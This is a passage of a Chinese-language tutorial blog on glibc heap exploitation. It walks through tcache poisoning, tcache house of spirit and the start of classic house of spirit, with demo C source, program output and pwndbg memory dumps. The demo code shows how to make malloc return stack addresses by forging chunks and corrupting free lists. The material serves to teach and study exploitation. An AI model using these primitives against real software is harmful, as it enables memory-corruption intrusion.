class="hljs-number">00000000091</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555756260</span>:<span class="hljs-number">0</span>x00007fffffffe5c0<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555756270</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555756280</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555756290</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>此时我们只需要malloc一次就可以取出来了（开篇时有提及，tcache是先进后出的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x b-2</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 0x7fffffffe5b0</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = &#123;</span><br>  mchunk_prev_size = 0x7fffffffe5e0, <br>  mchunk_size = 0x555555554942, <br>  fd = 0x5555555549a0, <br>  bk = 0x555555756260, <br>  fd_nextsize = 0x7fffffffe5c0, <br>  bk_nextsize = 0xa9ab61495b094700<br>&#125;<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x stack_var</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">3 = 0x5555555549a0</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><br></code></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>对于tcache poisoning来说，我们的利用极其简单</p><p>只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了</p><p>程序首先在栈上声明了一个变量，之后malloc了chunk a(size&#x3D;128),此时free掉chunk a,a被链入到free list中</p><p>然后程序覆写了a的fd指针，将其指向了我们的栈指针</p><p>现在栈指针也被链入了我们的free list中</p><p>此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出)</p><h1 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h1><h2 id="序-2"><a href="#序-2" class="headerlink" title="序"></a>序</h2><p>我们的tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-symbol">#include</span> &lt;stdio.h&gt;<br><span class="hljs-symbol">#include</span> &lt;stdlib.h&gt;<br><br>int main()<br>&#123;<br>    //本文件是通过tcache来利用house of sprirt技术的demo<br>fprintf(stderr, <span class="hljs-comment">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);<br><br>    //这个技术与原始的<span class="hljs-type">HOS</span>利用方式相似，但我们不需要在fake chunk被free之后创建fake chunk<br>fprintf(stderr, <span class="hljs-comment">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);<br><br>    //我们可以看到在malloc.c中的_int_free调用tcach_put时并没有检查下一个chunk的szie和prev_inuse位是合理的<br>fprintf(stderr, <span class="hljs-comment">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);<br><br>    //搜索字符串<span class="hljs-comment">&quot;invalid next size&quot;</span>和<span class="hljs-comment">&quot;double free or corruption&quot;</span><br>fprintf(stderr, <span class="hljs-comment">&quot;(Search for strings \&quot;</span>invalid next size\<span class="hljs-comment">&quot; and \&quot;</span>double free or corruption\<span class="hljs-comment">&quot;)\n\n&quot;</span>);<br><br>    //好了，现在我们开始<br>fprintf(stderr, <span class="hljs-comment">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);<br><br>    //先调用一次malloc来设置内存<br>fprintf(stderr, <span class="hljs-comment">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br>malloc(<span class="hljs-number">1</span>);<br><br>    //想象一下，现在我们覆写一个指针来指向我们的fake chunk区域<br>fprintf(stderr, <span class="hljs-comment">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);<br>unsigned long long *a; //pointer that will be overwritten<br>unsigned long long fake_chunks[<span class="hljs-number">10</span>]; //fake chunk region<br>    <br>    //该区域包括一个fake chunk<br>fprintf(stderr, <span class="hljs-comment">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br>    //此chunk的size必须在是符合tcache大小的即chunk的size要小于<span class="hljs-number">0x410</span>，这也就意味着我们malloc的size要小于<span class="hljs-number">0x408</span>(在x64位上。而我们的<span class="hljs-type">PREV_INUSE</span>(lsb)位在tcache chunks中是被忽略了的，但是另外两个标志位会引发一些问题，他们是<span class="hljs-type">IS_MAPPED</span>和<span class="hljs-type">NON_MAIN_ARENA</span><br>fprintf(stderr, <span class="hljs-comment">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br><br>    //要注意的是这个也必须是下一次malloc请求的size，会是一个区间，举一个例子，在x64上，<span class="hljs-number">0x30</span><span class="hljs-number">-0x38</span>都将被防到<span class="hljs-number">0x40</span>中，因此他们最后使用malloc的参数<br>fprintf(stderr, <span class="hljs-comment">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; // this is the size<br><br>    //现在我们将用有着第一个fake chunk地址的fake chunk与来覆写我们的指针<br>fprintf(stderr, <span class="hljs-comment">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br>    //要注意的是我们chunk的内存地址将会以<span class="hljs-number">16</span>字节对齐<br>fprintf(stderr, <span class="hljs-comment">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br><br>a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    //此时释放被覆写的指针<br>fprintf(stderr, <span class="hljs-comment">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br>free(a);<br><br>    //现在我们再malloc就会返回我们的fake chunk了<br>fprintf(stderr, <span class="hljs-comment">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>fprintf(stderr, <span class="hljs-comment">&quot;malloc(0x30): %p\n&quot;</span>, malloc(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-built_in">file</span> demonstrates <span class="hljs-keyword">the</span> house <span class="hljs-keyword">of</span> spirit attack <span class="hljs-keyword">on</span> tcache.<br>It works <span class="hljs-keyword">in</span> a similar way <span class="hljs-keyword">to</span> original house <span class="hljs-keyword">of</span> spirit <span class="hljs-keyword">but</span> you don&#x27;t need <span class="hljs-keyword">to</span> create fake chunk <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> fake chunk <span class="hljs-keyword">that</span> will be freed.<br>You can see this <span class="hljs-keyword">in</span> malloc.c <span class="hljs-keyword">in</span> function _int_free <span class="hljs-keyword">that</span> tcache_put <span class="hljs-keyword">is</span> called <span class="hljs-keyword">without</span> checking <span class="hljs-keyword">if</span> next chunk&#x27;s size <span class="hljs-keyword">and</span> prev_inuse are sane.<br>(Search <span class="hljs-keyword">for</span> strings <span class="hljs-string">&quot;invalid next size&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;double free or corruption&quot;</span>)<br><br>Ok. Let&#x27;s <span class="hljs-keyword">start with</span> <span class="hljs-keyword">the</span> example!.<br><br>Calling malloc() once so <span class="hljs-keyword">that</span> <span class="hljs-keyword">it</span> sets up <span class="hljs-keyword">its</span> memory.<br>Let&#x27;s imagine we will overwrite <span class="hljs-number">1</span> pointer <span class="hljs-keyword">to</span> point <span class="hljs-keyword">to</span> a fake chunk region.<br>This region <span class="hljs-keyword">contains</span> one fake chunk. It&#x27;s size field <span class="hljs-keyword">is</span> placed <span class="hljs-keyword">at</span> <span class="hljs-number">0x7ffcb22034d8</span><br>This chunk size has <span class="hljs-keyword">to</span> be falling <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> tcache category (chunk.size &lt;= <span class="hljs-number">0x410</span>; malloc arg &lt;= <span class="hljs-number">0x408</span> <span class="hljs-keyword">on</span> x64). The PREV_INUSE (lsb) bit <span class="hljs-keyword">is</span> ignored <span class="hljs-keyword">by</span> free <span class="hljs-keyword">for</span> tcache chunks, however <span class="hljs-keyword">the</span> IS_MMAPPED (<span class="hljs-keyword">second</span> lsb) <span class="hljs-keyword">and</span> NON_MAIN_ARENA (<span class="hljs-keyword">third</span> lsb) bits cause problems.<br>... note <span class="hljs-keyword">that</span> this has <span class="hljs-keyword">to</span> be <span class="hljs-keyword">the</span> size <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> next malloc request rounded <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> internal size used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> malloc implementation. E.g. <span class="hljs-keyword">on</span> x64, <span class="hljs-number">0x30</span><span class="hljs-number">-0x38</span> will all be rounded <span class="hljs-keyword">to</span> <span class="hljs-number">0x40</span>, so they would work <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> malloc parameter <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">end</span>. <br>Now we will overwrite our pointer <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> fake region inside <span class="hljs-keyword">the</span> fake <span class="hljs-keyword">first</span> chunk, <span class="hljs-number">0x7ffcb22034d8</span>.<br>... note <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> memory address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> *region* associated <span class="hljs-keyword">with</span> this chunk must be <span class="hljs-number">16</span>-byte aligned.<br>Freeing <span class="hljs-keyword">the</span> overwritten pointer.<br>Now <span class="hljs-keyword">the</span> next malloc will <span class="hljs-literal">return</span> <span class="hljs-keyword">the</span> region <span class="hljs-keyword">of</span> our fake chunk <span class="hljs-keyword">at</span> <span class="hljs-number">0x7ffcb22034d8</span>, which will be <span class="hljs-number">0x7ffcb22034e0</span>!<br>malloc(<span class="hljs-number">0x30</span>): <span class="hljs-number">0x7ffcb22034e0</span><br><br></code></pre></td></tr></table></figure><h2 id="关键代码调试-1"><a href="#关键代码调试-1" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>本例的断点如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">15</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-number">16</span> <br>► <span class="hljs-number">17</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);<br><br>  <span class="hljs-number">18</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a; <span class="hljs-comment">//pointer that will be overwritten</span><br>  <span class="hljs-number">19</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>]; <span class="hljs-comment">//fake chunk region</span><br>  <span class="hljs-number">20</span> <br>► <span class="hljs-number">21</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br>► <span class="hljs-number">25</span> fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br>  <span class="hljs-number">31</span> a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br>  <span class="hljs-number">32</span> <br>► <span class="hljs-number">33</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br><br>  <span class="hljs-number">34</span> <span class="hljs-built_in">free</span>(a);<br>  <span class="hljs-number">35</span> <br>► <span class="hljs-number">36</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-number">37</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>► <span class="hljs-number">38</span> &#125;<br><br></code></pre></td></tr></table></figure><p>下面我们进入调试</p><p>首先是我们malloc(1)的结果</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x555555757000</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">593</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x555555757250</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">33</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20d91</span><br>&#125;<br><span class="hljs-number">0x555555757270</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">134545</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果不知道为什么size是33，可以复习一下glibc源码实现，这里即使malloc(0)也是可以得到同样效果的</p><p>然后我们让程序继续跑起来</p><p>现在我们有了两个野指针，分别在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;a</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 0x7fffffffe568</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;fake_chunks</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = 0x7fffffffe570</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x fake_chunks</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">3 = &#123;0x9, 0x7ffff7dd7660, 0x7fffffffe5e8, 0xf0b5ff, 0x1, 0x555555554a6d, 0x7ffff7de59a0, 0x0, 0x555555554a20, 0x5555555546c0&#125;</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x a</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">4 = 0x756e6547</span><br></code></pre></td></tr></table></figure><p>现在我们给我们的fake chunk的size赋值为0x40，此时的fake_chunks</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunks<br><span class="hljs-number">$10</span> = &#123;<span class="hljs-number">0x9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x7fffffffe5e8</span>, <span class="hljs-number">0xf0b5ff</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x555555554a6d</span>, <span class="hljs-number">0x7ffff7de59a0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555554a20</span>, <span class="hljs-number">0x5555555546c0</span>&#125;<br></code></pre></td></tr></table></figure><p>然后把我们的fake_chunks[2]的值赋给我们的a，也就是将a指向我们的fd指针</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">2</span>gx a<br><span class="hljs-attribute">0x7fffffffe580</span>:<span class="hljs-number">0</span>x00007fffffffe5e8<span class="hljs-number">0</span>x0000000000f0b5ff<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx a-<span class="hljs-number">2</span> <br><span class="hljs-attribute">0x7fffffffe570</span>:<span class="hljs-number">0</span>x0000000000000009<span class="hljs-number">0</span>x0000000000000040<br><span class="hljs-attribute">0x7fffffffe580</span>:<span class="hljs-number">0</span>x00007fffffffe5e8<span class="hljs-number">0</span>x0000000000f0b5ff<br><span class="hljs-attribute">0x7fffffffe590</span>:<span class="hljs-number">0</span>x0000000000000001<span class="hljs-number">0</span>x0000555555554a6d<br><span class="hljs-attribute">0x7fffffffe5a0</span>:<span class="hljs-number">0</span>x00007ffff7de59a0<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7fffffffe5b0</span>:<span class="hljs-number">0</span>x0000555555554a20<span class="hljs-number">0</span>x00005555555546c0<br></code></pre></td></tr></table></figure><p>现在free a,此时我们就把我们的a放入了free list中</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x40 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x7fffffffe580 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>此时就可以将我们的地址malloc回来了</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>本例就是通过free一个fake chunk来让我们malloc任意地址</p><p>程序首先让堆初始化了，然后申请了变量a和fake_chunks</p><p>之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针</p><p>现在free a，我们的fake_chunk就被放到了free list中</p><p>此时再malloc就可以返回我们的fake chunk了</p><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h2 id="序-3"><a href="#序-3" class="headerlink" title="序"></a>序</h2><p>在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的</p><p>我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc</p><p>让我们来看看和tcache有什么区别吧</p><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br>  <span class="hljs-comment">//调用一次malloc来初始化堆  </span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>  <span class="hljs-comment">//现在我们将覆写一个指针来指向一个伪造的fastbin域</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a;<br>  <span class="hljs-comment">//这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存</span><br><span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((<span class="hljs-built_in">aligned</span> (<span class="hljs-number">16</span>)));<br><br>  <span class="hljs-comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br>  <span class="hljs-comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br>  <span class="hljs-comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br>fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br>  <span class="hljs-comment">//现在我们将通过有着fake first 